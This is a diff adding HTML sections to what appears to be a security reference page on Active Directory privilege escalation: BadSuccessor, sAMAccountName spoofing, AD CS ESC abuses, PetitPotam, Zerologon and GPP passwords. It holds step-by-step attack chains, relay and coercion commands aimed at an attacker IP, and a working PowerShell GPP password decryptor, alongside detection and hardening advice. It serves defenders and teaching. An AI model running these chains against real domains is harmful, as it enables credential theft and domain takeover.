+<li><a href="https://www.slideshare.net/DouglasBienstock/troopers-19-i-am-ad-fs-and-so-can-you">Troopers 19-I Am AD FS and So Can You</a></li>
+</uL>
+<pre>This is a test</pre>
+</section>
+
+<section id="privesc">
+<h2>Privilege Escalation</h2>
+<h3>BadSuccessor</h3>
+<article>
+<p>BadSuccessor is a privilege escalation primitive that abuses delegated Managed Service Accounts (dMSA)-a new account type introduced in Windows Server 2025-to let an ordinary domain user inherit the identity (and therefore the rights, group memberships, and Kerberos secrets) of any other user, up to and including domain admins.</p>
+<p>It is not a memory-corruption bug or a missing patch; it is a logic flaw in how the Key Distribution Center (KDC) honors the migration metadata that dMSASs carry with them by design. Bevause the attack works with default ACLs on most organizational units, it is considered both stealthy and reliable weaponizable in production forests.</p>
+<h3>1. What Makes dMSA Different and Dangerous?</h3>
+<p>A delegated MSA is meant to replace legacy user-based service accounts. During a planned migration you point the dMSA at the old account (<code>msDS-ManagedAccountPrecededByLink</code>) and the KDC copies the predecessor's PAC into the dMSAs Kerberos ticket so that existing services still remain functional.</p>
+<p>The <strong>security boundary</strong> is supposed to be who can create or modify that link; Microsoft assumed only Tier 0 admins would ever do so. In reality, the <code><strong>CreateChild</strong></code> right on an OU is enough, and Akamai's survey shows <strong>91% of environments</strong> grant that right to non-privileged groups such as Workstation Admins, Server Build, or even generic Account Operators.</p>
+<h3>2. Attack Flow in Plain Steps</h3>
+<p><strong>1. Recon:</strong>Attacker finds an OU where they can create a dMSA (LDAP <code>CreateChild</code> on <code>msDS-DelegatedManagedServiceAccount.</code></p>
+<p><em>What Windows / AD Sees:</em> Nothing suspicious-just another service account request.</p>
+<p><strong>2. Creation:</strong><code>New-ADServiceAccount -Name BadSuccessor -DNSHostName badsucc.corp.local</code></p>
+<p><em>What Windows / AD Sees:</em>Object created: KDS root key already present in WS-2025 DCs</p>
+<p><strong>3. Link:</strong>Write the distinguished name of <em>victim</em>(e.g., DA) into <code>msDS-ManagedAccountPrecededByLink</code></p>
+<p><em>What Windows / AD Sees:</em>Single attribute change, no special privilege on the victim object</p>
+<p><strong>4. Key Fetch:</strong><code>Install-ADServiceAccount</code> or <code>Get-ADServiceAccountKey</code></p>
+<p><em>What Windows / AD Sees:</em>DC generates a Kerberos PAC containing the victim's SID, groups, and rights</p>
+<p><strong>5. Use:</strong>Attacker requests a TGT or a TGS for the dMSA; presents ticket to any service.</p>
+<p><em>What Windows / AD Sees:</em> Service sees Domain Admin identity; attacker gains full control</p>
+<p>No credentials are cracked, no memory is corrupted, and the victim account is never modified-so classic integrity monitors stay green and happy.</p>
+<h3>Post-Patch Realities</h3>
+<p>Microsoft eventually shipped CVE-2025-53779 (July 2025) which enfores mutual consent: both the dMSA and the predecessor must reference each other before the KDC clones the PAC. That closes the escalation pathway, but two post-patch primitives remain useful to hackers and red teams:</p>
+<ul>
+<li><strong>Credential Capture:</strong> if you already own a privileged account you can still link it to a dMSA you control and export its long-term key without DCSync noise.</li>
+<li><strong>Stealthy Persistence:</strong> a dMSA can be created weeks in advance, left dormant, and activated only when the predecessor is disabled or deleted, giving a replication-free backdoor.</li>
+</ul>
+<h3>4. Detection & Hardening Cheat Sheet</h3>
+<ul>
+<li><strong>Audit dMSA creation</strong> (Event ID 4741 with <code>Class: msDS-DelegatedManagedServiceAccount</code>) and <strong>any write</strong> to <code>msDS-ManagedAccountPrecededByLink.</code></li>
+<li><strong>Inventory OU ACLs</strong> with the <code>[Get-BadSuccessorOUPermissions.ps1]</code> script; revoke <code>CreateChild</code> from standard support teams.</li>
+<li><strong>Limit readers</strong> of <code>msDS-ManagedPassword</code> to Tier 0; otherwise, the dMSA you create today can be used tomorrow by someone who merely gains generic service account rights.</li>
+<li><strong>Enforce "Audit Directory Service Changes"</strong> SACL on <code>CN=Managed Service Accounts,CN=System--</code> the link attribute changes will surface there even when normal AD auditing activities are quiet.</li>
+<li><strong>Treat dMSA creators as Tier 0 admins or equivalent;</strong> if the helpdesk needs to create service accounts, delegate <em>gMSA</em> rights instead-gMSAs do not possess the dangerous migration semantics.</li></ul>
+<p>BadSuccessor is a textbook example of how new identity primitives meant to reduce credential exposure can be flipped into universal skeleton keys when the permission model is inherited from yesterday's OU design. Until forests are re-architected with Tier 0 rigor, the attack remains a configuration vulnerability rather than a code flaw, and the only patch is disciplined delegation.</p>
+</article>
+</section>
+
+<section id="badsucc-res">
+<h2>BadSuccessor Abuse Resources</h2>
+  <ul>
+<li><a href="https://www.tarlogic.com/blog/badsuccessor/">BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory</a></li>
+<li><a href="https://medium.com/seercurity-spotlight/operationalizing-the-badsuccessor-abusing-dmsa-for-domain-privilege-escalation-429cefc36187">Operationalizing the BadSuccessor: Abusing dMSA for Domain Privilege Escalation</a></li>
+<li><a href="https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/">Exploiting Delegated Managed Service Accounts in Active Directory</a></li>
+<li><a href="https://www.semperis.com/blog/how-to-block-badsuccessor/">How to Block BadSuccessor</a></li>
+<li><a href="https://specterops.io/blog/2025/05/27/understanding-mitigating-badsuccessor/">Understanding & Mitigating BadSuccessor</a></li>
+<li><a href="https://socprime.com/blog/detect-badsuccessor-attacks/">BadSuccessor Detection: Critical Windows Server Vulnerability Can Compromise Any User in Active Directory</a></li>
+<li><a href="https://academy.bluraven.io/blog/detecting-badsuccessor">Detecting BadSuccessor: Shortcut to Domain Admin</a></li>
+</ul>
+</section>
+
+<section id="sam-acct">
+<h3><code>sAMAccountName</code> Spoofing</h3>
+<article>
+<p><code>sAMAccountName</code> spoofing is a design-level flaw in how Active Directory maps the <code>sAMAccountName</code> attribute to Kerberos identities, weaponized to impersonate high-privilege computer accounts and escalate from any domain user to Domain Admin in a handful of LDAP writes and ticket requests.</p>
+<h3>1. Why The Attribute Matters</h3>
+<p><code>sAMAccountName</code> is the legacy NetBIOS-style account identifier.</p>
+<ul>
+<li><strong>User accounts</strong> look like <code>JDOE</code></li>
+<li><strong>Computer accounts</strong> are supposed to look like <code>SERVER01$</code> (the trailing <code>$</code> tells the KDC it is a machine)</li></ul>
+<p> No built-in logic ever enforced that <code>$</code> suffix, so an attacker who can rename an object can strip that dollar sign and momentarily own the bare name.</p>
+<h3>2. The Two CVEs That Made It Famous</h3>
+<ul>
+<li><strong>CVE-2021-42278</strong> - <em>"name impersonation"</em> lets any account creator remove the <code>$</code> and rename a computer account to the exact NetBIOS name of the domain controller (e.g., <code>DC01</code>).</li>
+<li><strong>CVE-2021-42287</strong> - <em>"KDC Baboozling"</em> - when a TGS is requested for an account that no longer exists, the KDC helpfully retries the lookup appending <code>$;</code> if a DC with that new name already exists, the ticket is then issued with the DCs privileges.</li>
+</ul>
+<p> Chained together, the trick becomes:</p>
+<p><strong>Step 1:</strong>Create (or take ownership of) a machine account <code>EVIL$</code> - allowed by default (<code>ms-DS-MachineAccountQuota = 10)</code></p>
+<p><strong>Step 2:</strong>Clear its <code>servicePrincipalName</code> (rename fails otherwise) - owner can edit</p>
+<p><strong>Step 3:</strong>Rename <code>EVIL$ >> DC01</code> (no <code>$</code>) - accepted - no validation</p>
+<p><strong>Step 4:</strong>Request a TGT for <code>DC01</code> - KDC issues TGT containing the <em>new</em>name</p>
+<p><strong>Step 5:</strong>Rename <code>DC01 >> EVIL$</code> again - account now exists with <code>$</code></p>
+<p><strong>Step 6:</strong>Use <strong>S4U2self</strong>to ask for a service ticket to <code>DC01</code> as any user (e.g., Administrator) - KDC can't find <code>DC01</code>, retries <code>DC01</code>, finds the real DC, encrypts ticket with DCs long-term key, but embeds the original requestor's PAC >> attacker receives a usable ticket as Domain Admin</p>
+<p>The whole exchange is standard Kerberos, so no traffic looks abnormal; the only artifacts are a few LDAP writes and two Kerberos exchanges. All too normal in a fast functioning AD environment.</p>
+<h3>3. What You See in the Logs (if you look)</h3>
+<ul>
+<li>Event ID <strong>4741:</strong>computer account created</li>
+<li>Event ID <strong>4742:</strong><code>sAMAccountName</code> modified (look for rename <strong>away-from</strong> and <strong>back-to</strong> the same root name within minutes of each other</li>
+<li>Event ID <strong>4768:</strong>TGT requested for an account name without <code>$</code> that matches a DC NetBIOS name</li>
+<li>Event ID <strong>4769:</strong>service ticket granted to a DC computer account from a different source account</li>
+<li>Event ID <strong>38:</strong><code>KDC_ERR_TGT_REVOKED</code> when PAC validation fails because original requestor ≠ ticket owner</li>
+</ul>
+<h3>Remediation Cheat Sheet</h3>
+<p><strong>1. Patch DCs:</strong> November 2021 updates enforcec <code>$</code> suffix and embed original-requestor SID in PAC</p>
+<p><strong>2. Set <code><strong>ms-DS-MachineAccountQuota = 0</strong></code></strong> stops low-privileged users from creating new computers in the domain</p>
+<p><strong>3. Audit <code><strong>CreateChild</code> on OUs</strong> - many helpdesk grops can still add machines</p>
+<p><strong>4. Monitor for renames:</strong>any computer whose <code>sAMAccountName</code> loses or gains a <code>$</code> is automatically sus</p>
+<p><strong>5. Protect DC computer objects:</strong> enable <code>AdminSDHolder</code> or explicit ACL so only Tier 0 can write <code>sAMAccountName</code></p>
+<p><strong>6. Forward AD FS / AD CS logs:</strong> attackers often chain <code>noPAC</code> with certificate or federation abuse to leave on-prem entirely</p>
+<p>Overall, <code>sAMAccountName</code> spoofing is a reminder that <strong>naming conventions are security controls;</strong> one missing <code>$</code> is all it takes to turn a regular employee into the domain's highest authority.</p>
+</article>
+</section>
+
+<section id="samacct-res">
+<h2><code>sAMAccountName</code>Spoofing Resources</h2>
+  <ul>
+<li><a href="https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing">sAMAccountName Spoofing</a></li>
+<li><a href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html">CVE-2021-42287 / CVE-2021-42278 Weaponization</a></li>
+<li><a href="https://medium.com/@mvelazco/hunting-for-samaccountname-spoofing-cve-2021-42287-and-domain-controller-impersonation-f704513c8a45">Hunting for samAccountName Spoofing</a></li>
+<li>Potential Privilege Escalation via SamAccountName</li>
+<li><a href="https://cloudbrothers.info/en/exploit-kerberos-samaccountname-spoofing/">Exploit samAccountName Spoofing with Kerberos</a></li>
+<li><a href="https://pentestlab.blog/2022/01/10/domain-escalation-samaccountname-spoofing/">Domain Escalation - sAMAccountName Spoofing</a></li>
+<li><a href="https://www.sentinelone.com/blog/samaccountname-spoofing-kdc-bamboozing/">Preventing SAMAccountName Spoofing and KDC Bamboozling</a></li>
+<li><a href="https://www.hackingarticles.in/windows-privilege-escalation-samaccountname-spoofing/">Windows Privilege Escalation: sAMAccountName Spoofing</a></li>
+<li><a href="https://4sysops.com/archives/exploiting-the-cve-2021-42278-samaccountname-spoofing-and-cve-2021-42287-deceiving-the-kdc-active-directory-vulnerabilities/">Exploiting the CVE-2021-42278 (sAMAccountName Spoofing)</a></li>
+<li><a href="https://lecoquierre.com/pentest-nopac-samaccountname-spoofing/">NoPAC / samAccountNameSpoofing Pentest</a></li>
+</ul>
+</section>
+
+<section id="adcs">
+<h3>Abusing Active Directory Certificate Services Formatting</h3>
+<article>
+<p>Abusing Active Directory Certificate Services (AD CS) has become one of the most reliable privilege-escalation and persistence techniques on internal networks.  The service itself is not buggy; it simply ships with defaults that reward convenience over control, and once an attacker understands the vocabulary—templates, enrollment agents, EKUs, SANs, ESC1-ESC8—the domain becomes a certificate minefield.</p>
+<h3>1. Why Certificates are Dangerous</h3>
+<p>A certificate binds a public key to an identity.  If a CA that the domain trusts (<code>NTAuthCertificates</code> object) issues a certificate with <em>Client Authentication</em> in the EKU, that certificate is accepted by every DC for Kerberos PKINIT logon. Possession of the private key is therefore equivalent to knowing the account’s password, but the key never expires until the certificate is revoked, and revocation is almost never audited in real time.
+<h3>2. Discovery: Mapping the Minefield</h3>
+<p>No special rights are required to read the configuration: it is stored in the Configuration partition and replicated to every DC.  With any domain user you can:</p>
+<ul>
+<li>Enumerate CAs:
+<code>certutil -config - -ping</code>
+<p>LDAP query for <code>objectClass=pKIEnrollmentService</code> under <code>CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=…</code></li></p>
+<li>Dump Templates:
+<code>certipy find</code> or <code>certify find</code> returns every template, its ACL, its EKUs, and flags such as <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (ESC1)</code> or <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> (ESC2/ESC3).</li>
+<li>Check Who Can Enroll:
+BloodHound now has edges for <code>GenericAll/WriteDacl/WriteProperty/Enroll</code> on templates and <code>ManageCA/ManageCertificates</code> on CAs.</li>
+</ul>
+<p>In most engagements the first pass reveals at least one template that grants Domain Users the ability to request a certificate with Client Authentication and lets the requester supply an arbitrary SAN — the textbook ESC1 condition.</p>
+<h3>3. ESC1 – The Classic “SAN Swap”</h3>
+<p>1. CSR is generated on the attacker workstation; SAN field contains <code>Administrator@corp.local.</code></p>
+<p>2. CSR is submitted with <code>certreq</code> or <code>certipy req</code> against the vulnerable template.</p>
+<p>3. CA validates only the template ACL, not the SAN, and issues the certificate.</p>
+<p>3. <code>certipy auth</code> or <code>gettgtpkinit</code> uses the new certificate to obtain a TGT for the chosen identity — usually DA.</p>
+<p>Pass-the-TGT and run <code>secretsdump</code> or any other DCSync-style extraction.</p>
+<p>The entire chain requires one valid domain user, no malware, and leaves only two obvious logs: 4886 (request) and 4887 (issue) on the CA — events almost no-one forwards to a SIEM.</p>
+<h3>4. ESC7 – When The CA Itself is Mis-Delegated</h3>
+<p>If Manage CA is granted to non-Tier-0 personnel (common for “server guys” or the <code><em>CERTSVC_DCOM_ACCESS</code></em> group), the attacker can:</p>
+<ul>
+<li>Enable the built-in <code><em>SubCA</code></em> template (already has Client Auth EKU and SAN support).</li>
+<li>Grant the Manage Certificates right.</li>
+<li>Submit a CSR for <code><em>SubCA</code></em>, let it be denied, then manually mark the request <em>Issued</em> from the MMC.</li>
+<li>Export the certificate and private key >> full domain admin via PKINIT.</li></ul>
+<p>Because the action is performed through the official MMC or <code>certutil -resubmit</code>, AV and EDR stay silent; the only artifact is a 4887 event issued to an account that technically had permission.</p>
+<h3>5. ESC8 – Web Enrollment as an NTLM Relay Target</h3>
+<p>AD CS often exposes an HTTP enrollment endpoint (<code>/certsrv/</code>).  The IIS site supports NTLM authentication, making it a perfect relay destination:</p>
+<p>1. Coerce a DC to authenticate to the attacker (PrinterBug, PetitPotam, ShadowCop).</p>
+<p>2. Relay the DC’s NTLM session to <code>https://CA/certsrv/certfnsh.asp</code> and request a certificate with <code>SAN = DC01$</code>.</p>
+<p>3. Receive a <code>.pfx</code> file valid for the DC machine account >> Kerberos TGT >> full AD compromise.</p>
+<p>The attack is unauthenticated on the outside, uses only native Windows features, and bypasses the template ACL because the request is seen as coming from the DC itself.</p>
+<h3>6. Persistence Angles</h3>
+<p>Certificates do not honor password expiry or 30-day machine account rotations. An attacker can effectively:</p>
+<ul>
+<li>Issue a long-term certificate (5-10 years) for a high-value account and squirrel it away.</li>
+<li>Embed an alternate SAN for the <code>krbtgt</code> account or a trusted service principal, enabling Golden-SAML or cross-forest movements.</li>
+<li>Publish the certificate in <code><em>UserCertificate</em></code> attribute of a disabled or decoy account-invisible to most user-hunting scripts.</li>
+</ul>
+<h3>7. Hardening and Detection</h3>
+<h4>1. Patch</h4><p>
+CVE-2022-26923 enforce Subject / SAN mismatch checks and requires the requesting account to own the <code>dNSHostName</code> attribute.</p>
+<h4>2. Audit Templates</h4><p>
+Disable or restrict any templates that contain Client Authentication <strong>and</strong> allows enrollee-supplied SAN.</p>
+<h4>3. Strip Low-Privileged Enrollments</h4><p>
+Remove <code>Domain Users, Authenticated Users</code> from sensitive templates; instead, use <em>Role-Based Access Control (RBAC)</em> groups.</p>
+<h4>4. Protect CA ACLs</h4><p>
+Treat <code>Manage CA, Manage Certificates</code>, and <code>Issue & Manage Certificates</code> as Tier 0 equivalent.</p>
+<h4>5. Disable Web Enrollment</h4>
+<p>Or force EPA + Kerberos-only authentication on <em>Internet Information Services (IIS)</em> on the webserver.</p>
+<h4>6. Short Lifetimes</h4><p>
+1 year max; 90 days better; force renewal friction.</p>
+<h4>7. Log & Alert</h4><p>
+Ship 4886, 4887, 4768, 4776, 4741, 4742, to SIEM and baseline normal enrollment patterns.</p>
+<h4>8. HSM Storage</h4><p>
+Keep CA keys in hardware so even CA admins cannot export and forge offline.</p>
+<p> AD CS is not inherently buggy; it is <strong>over-permissioned by default</strong> and almost always installed before anyone even drafts up a certificate policy. Treat every CA as you would a <strong>domain controller that speaks X.509</strong>, and you will approach its configuration with the same paranoia you reserve for AD itself.</p>
+</ul>
+</article>
+</section>
+
+<h2>AD CS Resources</h2>
+<section id="adcs-res">
+  <ul>
+<li><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">Certified Pre-Owned</a></li>
+<li><a href="https://blog.truesec.com/2021/08/05/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory/">From Stranger to DA // Using PetitPotam to NTLM Relay to Domain Administrator</a></li>
+<li><a href="https://medium.com/@k45arbaz/attacking-active-directory-certificate-services-adcs-and-escalating-privileges-9c0d916d68e6">Attacking Active Directory Certificate Services (AD CS) and Escalating Privileges</a></li>
+<li><a href="https://zer1t0.gitlab.io/posts/attacking_ad/">Attacking Active Directory: 0 to 0.9</a></li>
+<li><a href="https://rapid7.github.io/metasploit-framework/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html">Attacking AD CS ESC Vulnerabilities Using Metasploit</a></li>
+</ul>
+</section>
+
+<section id="petitpotam">
+<h3>PetitPotam</h3>
+<article>
+<p>PetitPotam is a coerced-authentication attack that abuses the <code>MS-EFSRPC</code> (Encrypting File System Remote Protocol) interface to force a Windows host—most dangerously a Domain Controller—to authenticate to an attacker-chosen machine via NTLM. The beauty (and peril) of the technique is that no user interaction, no credentials, and no malware are required; the attacker simply makes an RPC call and the DC obediently sends its machine-account hash across the wire.</p>
+---
+<h3>1.  How the PetitPotam Attacks Works</h3>
+<h4>1. Attacker Listens</h4>  
+<code>ntlmrelayx.py -t http://pki.corp.local/certsrv/certfnsh.asp --adcs --template KerberosAuthentication</code> or any other relay target (LDAP, SMB, RPC, IMAP, etc.).</p>
+<h4>2. Attacker Coerces</h4>  
+<p><code>PetitPotam.py &lt;attacker-ip&gt;dc-ip&gt;</code></p>  
+The tool calls <code>EfsRpcOpenFileRaw</code> against the DC’s <code>lsarpc</code> or <code>efsrpc</code> pipes.</p> 
+<p>The DC, believing it must open an encrypted file for remote backup, issues an SMB session-setup to the attacker’s IP.</p>
+<h4>3. Hash is Captured & Relayed</h4>  
+<p>The NTLM handshake is forwarded to the chosen service. If AD CS Web Enrollment is enabled and EPA is missing, the relay succeeds and the attacker obtains a <code>PKCS#12</code> certificate enrolled in the name of the DC computer account.</p>
+<h4>4. Privilege is Minted</h4>
+<ul>
+<li>Import the certificate into Kekeo or Rubeus</li>
+<li>Request a TGT for <code>DC01$@CORP.LOCAL</code></li>  
+<li>Extract the NT hash or use Pass-The-Ticket</li>
+<li>Dump <code>NTDS.dit</code>, create Golden tickets, or DCSync at will.</li></ul>
+<p>The entire chain—from anonymous RPC call to Domain Admin—takes seconds and leaves only Event IDs 4768/4769 if you are already collecting them.</p>
+---
+<h3>2.  Why PetitPotam is Still Relevant</h3>
+<ul>
+<li><strong>Patch Tuesday (Aug 2021)</strong> introduced CVE-2021-36942 and forced authenticated RPC calls, but any domain user is still enough to trigger the coercion.</li> 
+<li>EPA + HTTPS on AD CS Web Enrollment is disabled by default, so most farms remain relayable.</li>  
+<li>Printer Spooler is increasingly disabled; <code>MS-EFSRPC</code> is always on because backup agents need it.</li>  
+<li>New Impacket, Mimikatz, and <code>Certipy</code> branches ship PetitPotam as a library call, so the primitive is now one-liner in larger tool-chains.</li></ul>
+---
+<h3>3.  Detection Opportunities</h3>
+<ul>
+<li><strong>Event 5145</strong> – <code>ShareName = \\*\IPC$, RelativeTargetName = efsrpc OR lsarpc, AccessMask = 0x3</code> from unexpected IP</li>
+<li><strong>Event 4768</strong> – TGT requests for computer accounts originating from non-computer source IPs.</li>  
+<li><strong>Event 4886 / 4887</strong> – Certificate requests and issues for DC accounts outside maintenance windows.  
+<li><strong>Network</strong> – RPC bind to interface <code>c681d488-d850-11d0-8c52-00c04fd90f7e</code> followed by outbound SMB session from DC to non-DNS-suffix IP.</li></ul>
+---
+<h3>4.  Hardening Checklist</h3>
+<h4>1. Patch</h4> – CVE-2021-36942 forces authenticated RPC; apply to all DCs first.</p>   
+<h4>2. Disable NTLM where possible;</h4><p> if not, enforce EPA + HTTPS + Extended Protection on AD CS Web Enrollment</p>
+<h4>3. Enable SMB signing everywhere;</h4><p> PetitPotam can also be relayed to LDAP/SMB for DCSync or shadow credentials</p>  
+<h4>4. Restrict DCs</h4> <p>from initiating SMB/RPC to member servers via Windows Firewall GPO</p>
+<h4>5. Set <code>HKLM\SYSTEM\CurrentControlSet\Services\EFS\Parameters\AllowEfsRpcOpenFileRaw = 0</code></h4><p> to block the call entirely (no functional impact on modern backup agents)</p>
+<h4>6. Audit <code>ms-DS-MachineAccountQuota</code></h4d>;<p> many chains start by creating a fake computer to hold the relay listener</p>  
+<p>PetitPotam is the perfect example of how legacy protocols (NTLM) and convenience features (Web Enrollment) intersect to create critical exposures.  Until NTLM is retired and EPA is mandatory, assume that any DC that can reach an HTTP service is one RPC call away from surrendering its identity.</p>
+</ul>
+</article>
+</section>
+
+<h2>PetitPotam Resources</h2>
+  <ul>
+<li><a href="https://blog.truesec.com/2021/08/05/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory/">PetitPotam to NTLM Relay to Domain Administrator</a></li>
+<li>PetitPotam: Expanding NTLM Relay Attacks</li>
+<li><a href="https://www.nccgroup.com/research-blog/detecting-and-hunting-for-the-petitpotam-ntlm-relay-attack/">Detecting and Hunting for the PetitPotam NTLM Relay Attack</a></li>
+<li><a href="https://www.optiv.com/insights/source-zero/blog/petitpotam-active-directory-certificate-services">PetitPotam & Active Direcotry Certificate Services</a></li>
+<li><a href="https://www.semperis.com/blog/petitpotam-attack-on-windows-domains/">Detecting and Mitigating the PetitPotam Attack on Windows</a></li>
+<li><a href="https://news.sophos.com/en-us/2021/08/25/how-petitpotam-hijacks-the-windows-api-and-what-you-can-do-about-it/">How PetitPotam Hijacks the Windows API and What You Can Do About It</a></li>
+<li><a href="https://www.sprocketsecurity.com/blog/the-ultimate-tag-team-petitpotam-and-adcs-pwnage-from-linux">PetitPotam and AD CS Pwnage From Linux</a></li>
+<li><a href="https://brandefense.io/wp-content/uploads/2023/01/PetitPotam-Vulnerability-Analysis.pdf">PetitPotam Vulnerability Analysis</a></li>
+<li><a href="https://success.trendmicro.com/en-US/solution/KA-0012235">PetitPotam Exploit Detection, Protection, and Response</a></li>
+</ul>   
+</article>
+</section>
+
+<section id="zerologon">
+<h3>Zerologon</h3>
+<article>
+<p>Zerologon is a cryptographic flaw in the Netlogon Remote Protocol (<code>MS-NRPC</code>) that allows an unauthenticated attacker on the same network segment to reset the password of a domain controller’s computer account to an empty string by sending a sequence of all-zero challenges.</p>
+<p>The root cause is <code>AES-CFB8</code> encryption with a fixed, all-zero IV combined with poor validation of the client’s proof; after an average of 256 attempts the server accepts the zero ciphertext and obediently overwrites its own machine account hash in Active Directory with the null value.</p>
+<p>Once the hash is known the attacker can perform a pass-the-hash logon, obtain a Kerberos TGT as the DC computer account, and run DCSync to pull the full <code>NTDS</code> database, effectively turning a network foothold into complete forest compromise in under a minute. The only immediate artifact is that the real DC can no longer replicate because its local LSA secret no longer matches the value stored in AD, but this replication break is often dismissed as a transient issue until the attacker has already exfiltrated every credential.</p>
+<p>Microsoft released CVE-2020-1472 in August 2020 and enforced secure RPC channels in a phased rollout; defenders should ensure all domain controllers are patched, enable enforcement mode for <code>“Require Seal,”</code> monitor Event ID 5825 for denied vulnerable connections, and treat any unexpected DC password reset as a critical incident.</p>
+<ul>
+<li><a href="https://www.crowdstrike.com/en-us/blog/cve-2020-1472-zerologon-security-advisory/">Zerologon (CVE-2020-1472): Overview, Exploit Steps, and What You Need to Know</a></li>
+<li><a href="https://www.tenable.com/blog/one-year-later-what-can-we-learn-from-zerologon">One Year Later: What Can We Learn From Zerologon?</a></li>
+<li><a href="https://www.semperis.com/blog/zerologon-explained/">/Zerologon Exploit Explained</a></li>
+<li><a href="https://blog.netwrix.com/2023/04/14/zerologon/">What is Zerologon and How Do You Mitigate It?</a></li>
+<li><a href="https://www.secureops.com/blog/zerologon-vulnerability/">How Zerologon Illustrates the Importance of Vulnerability Analysis</a></li>
+<li><a href="https://www.researchgate.net/publication/360834998_Zerologon_Unauthenticated_domain_controller_compromise_by_subverting_Netlogon_cryptography">Zerologon: Unauthenticated Domain Controller Compromise</a></li>
+</ul>
+</article>
+</section>
+
+<section id="adpass">
+<h3>Passwords in <code>SYSVOL</code>& Group Policy Preferences (GPP)</h3>
+<article>
+<p>Passwords in <code>SYSVOL</code> and Group Policy Preferences (GPPs) are the textbook example of "set-and-forget" configuration that quietly becomes a skeleton key for every low-privileged domain user.</p>
+<p>Because <code>SYSVOL</code> is replicated to every Domain Controller and is readable by <strong>Authenticated Users</strong>, anything dropped there is effectively world-readable inside the AD forest. For years administrators used this space to store log-on scripts, drive-mappings, and-fatally-<strong>embedded credentials.</strong></p>
+<h4>1. Cleartext Sins in Scripts</h4> 
+<p>The simplest mistake is a <code>.bat, .vbs</code>, or <code>.ps1</code> file sitting in<code>\\domain.com\SYSVOL\domain.com\scripts</code> that contains lines such as:
+<code>net user administrator</code>
+<code>SuperSecret123! /add</code>
+or
+<code>objUser.SetPassword "Winter2025!"</code>
+Every domain user (and any subsequent compromised workstations) can open that file with a double click; no exploitation required. Attackers often automate the harvest with a single command:
+<code>findstr /S /I "password\|passwd\|pwd"</code>
+<code>\\domain.com\SYSVOL\*.bat</code>
+<code>\\domain.com\SYSVOL\*.vbs</code></p>
+<h4>2. Group Policy Preferences-The Encrypted Lie</h4>
+<p>Between 2008 and 2014 Microsoft's Group Policy Preferences (GPP) let admins push local Administrator passwords, scheduled tasks, or mapped drives that needed alternative credentials. The accompanying XML files live in <code>\\domain.com\SYSVOL\domain.com\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml</code> (or <code>ScheduledTasks.xml, DataSources.xml, Printers.xml</code>).</p>
+<p>Passwords were "protected" with AES-256, but Microsoft also published the 32-byte static key in the SDK documentation. The moment the XML is in SYSVOL, anyone can decrypt the value stored in the <code>cpassword</code> attribute as such:</p>
+<code># one-liner recovery
+[Reflection.Assembly]::LoadWithPartialName("System.Security")
+$k = [byte[]]@(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
+              0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
+$c = "cpassword from XML"
+$b = [Convert]::FromBase64String($c)
+$a = New-Object System.Security.Cryptography.AesCryptoServiceProvider
+$a.Key = $k; $a.Mode = "ECB"
+$d = $a.CreateDecryptor().TransformFinalBlock($b, 0, $b.Length)
+[System.Text.Encoding]::Unicode.GetString($d)</code>
+<p>Tools such as <code>Get-GPPPassword</code> (PowerSploit), <code>gpprefdecrypt.py</code>, or the Metasploit post module automate the entire process for you.</p>
+<h4>3. Business Impact</h4>
+<p>Because GPP was often used to set the same local Administrator password on every workstation, a single decrypted <code>cpassword</code> attribute grants lateral movement to every desktop, laptop, and server where that policy is applied. Ethical hackers routinely escalate from a plain-domain-user toehold to hundreds of local admins in sheer minutes, then harvest cached Domain Admin tokens to perform a DCSync attack from a previously uninteresting mostly forgotten-about system.</p>
+<h4>4. The Official "Fix" That Did Not Clean Up Well</h4>
+<p>Microsoft released MS14-025 (KB2962486) in May 2014, removing the password boxes from the GPP GUI but explicitly refused to delete existing XML files. Enterprises that had deployed password-bearing policies years earlier still host them in their <code>SYSVOL</code> today; they replicate to every new DC and are immutable unless manually removed.</p>
+<h4>5. Detection & Eradication Checklist</h4>
+<p><strong>1. Hunt First</strong></p>
+<p><code>findstr /S /I cpassword \\</code></p>
+<p><code>&nlt;<domain>\SYSVOL\</code>></p>
+<p><code>&nlt;<domain>\Policies\*.xml</code></p>
+<h4>2. Delete Offending XML via GPMC</h4>
+<p>Or navigate to the GPO and remove the preference item manually.</p>
+<h4>3. Force Replication</h4>
+<p>After replication has been forced by running the <code>gpupdate /force</code> command, delete the XML from <code>SYSVOL</code> on each DC; GPMC only removes the logical link, not the file itself.</p>
+<h4>4. Change Every Local Administrator Password</h4>
+<p>Change every local administrator passwords that was managed by the old GPP; assume breach and compromise.</p>
+<h4>5. Deploy LAPS (Local Administrator Password Solution</h4>
+<p>Deploy LAPS so each machine has a unique, rotated, audited password instead of a shared and reused one that many may already know; lessons the attack surface.</p>
+<h4>6. Audit Scope Shares</h4>
+<p>Search for <code>.bat, .vbs, .ps1</code> in both <code>SYSVOL\scripts</code> and <code>NETLOGON</code> for hard-coded secrets and replace them with <em>Group-Managed Service Accounts (gMSAs)</em> or credential-less tasks taht run as <code>SYSTEM.</code></p>
+<h4>7. Log and Alert on Event ID 4663</h4>
+<p>Log and alert on Event ID 4663 (Object Access) when <code>cpassword</code> attributes are read; the volume is low and indicates <strong>live abuse.</strong></p>
+<p>Bottom line: <code>SYSVOL</code> is <strong>public inside the domain.</strong> If a password lives there-encrypted or not-it is already compromised. Delete legacy GPP files as necessary, migrate to a LAPS-based automated password changing solution, and treat any scripts in <code>SYSVOL</code> like a billboard on the Internet (e.g., use with caution).</p>
+<ul>
